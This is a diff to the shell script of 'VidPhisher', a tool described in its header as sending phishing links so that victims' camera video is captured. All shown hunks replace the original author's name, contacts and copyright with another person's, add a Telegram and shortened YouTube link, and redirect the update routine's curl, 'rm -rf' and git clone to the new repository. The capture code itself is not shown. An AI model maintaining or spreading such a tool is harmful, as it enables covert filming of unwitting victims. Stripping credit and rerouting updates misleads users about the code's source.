@@ -3,13 +3,15 @@
 # VideoPhisher
 # Version    : 1.0
 # Description: VidPhisher is a camera Phishing tool. Send a phishing link to victim, if he/she gives access to camera, his/her video will be captured!
-# Author     : KasRoudra
-# Github     : https://github.com/KasRoudra
-# Email      : kasroudrakrd@gmail.com
+# Author     : alvinbaby
+# Github     : https://github.com/alvinbaby
+#YouTube : https://bit.ly/3pSnvho
+#Telegram : @MrJinnTelegram
+# Email      : alvinbaby540@gmail.com
 # Credits    : TechChipNet, RecordRTC
 # Date       : 05-06-2022
 # License    : GPLv3
-# Copyright  : KasRoudra 2022
+# Copyright  : alvinbaby 2022
 # Language   : Shell
 # Portable File
 # If you copy, consider giving credit! We keep our code open source to help others
@@ -85,7 +87,7 @@ patents cannot be used to render the program non-free.
   The precise terms and conditions for copying, distribution and
 modification follow.
 
-Copyright (C) 2022 KasRoudra (https://github.com/KasRoudra)
+Copyright (C) 2022 alvinbaby (https://github.com/alvinbaby)
 LicenseInfo
 
 
@@ -122,8 +124,8 @@ ${red}\ \   / (_) __| |  _ \| |__ (_)___| |__   ___ _ __
 ${cyan} \ \ / /| |/ _' | |_) | '_ \| / __| '_ \ / _ \ '__| 
 ${purple}  \ V / | | (_| |  __/| | | | \__ \ | | |  __/ | 
 ${yellow}   \_/  |_|\__,_|_|   |_| |_|_|___/_| |_|\___|_| 
-${red}                                          [v${version}] 
-${blue}                                  [By KasRoudra] 
+${red}   Telegram : @MrJinnTelegram                [v${version}] 
+${blue}  YouTube : https://bit.ly/3pSnvho         [By alvinbaby] 
 "
 
 
@@ -466,14 +468,14 @@ if [[ -z $UPDATE ]]; then
     exit 1
 else
     if [[ $UPDATE == true ]]; then
-        git_ver=`curl -s -N https://raw.githubusercontent.com/KasRoudra/VidPhisher/main/files/version.txt`
+        git_ver=`curl -s -N https://raw.githubusercontent.com/alvinbaby/VidPhisher/main/files/version.txt`
     else
         git_ver=$version
     fi
 fi
 
 if [[ "$version" != "$git_ver" && "$git_ver" != "404: Not Found" ]]; then
-    changelog=`curl -s -N https://raw.githubusercontent.com/KasRoudra/VidPhisher/main/files/changelog.log`
+    changelog=`curl -s -N https://raw.githubusercontent.com/alvinbaby/VidPhisher/main/files/changelog.log`
     clear
     echo -e "$logo"
     echo -e "${info}VidPhisher has a new update!\n${info}Current: ${red}${version}\n${info}Available: ${green}${git_ver}\n"
@@ -481,7 +483,7 @@ if [[ "$version" != "$git_ver" && "$git_ver" != "404: Not Found" ]]; then
         read upask
         printf "$nc"
         if [[ "$upask" == "y" ]]; then
-            cd .. && rm -rf VidPhisher vidphisher && git clone https://github.com/KasRoudra/VidPhisher
+            cd .. && rm -rf VidPhisher vidphisher && git clone https://github.com/alvinbaby/VidPhisher
             echo -e "\n${success}VidPhisher updated successfully!!"
             if [[ "$changelog" != "404: Not Found" ]]; then
             echo -e "${purple}[•] Changelog:\n${blue}${changelog}"
@@ -594,10 +596,10 @@ fi
         echo -e "$red[ToolName]  ${cyan}  :[VidPhisher]
 $red[Version]    ${cyan} :[${version}]
 $red[Description]${cyan} :[Video Phishing tool]
-$red[Author]     ${cyan} :[KasRoudra]
-$red[Github]     ${cyan} :[https://github.com/KasRoudra]
-$red[Messenger]  ${cyan} :[https://m.me/KasRoudra]
-$red[Email]      ${cyan} :[kasroudrakrd@gmail.com]"
+$red[Author]     ${cyan} :[alvinbaby]
+$red[Github]     ${cyan} :[https://github.com/alvinbaby]
+$red[Telegram]  ${cyan} :[@MrJinnTelegram]
+$red[YouTube]    ${cyan} :[https://bit.ly/3pSnvho]"
         printf "${cyan}\nVid${nc}@${cyan}Phisher ${red}$ ${nc}"
         read about
     elif echo $option | grep -q "m"; then
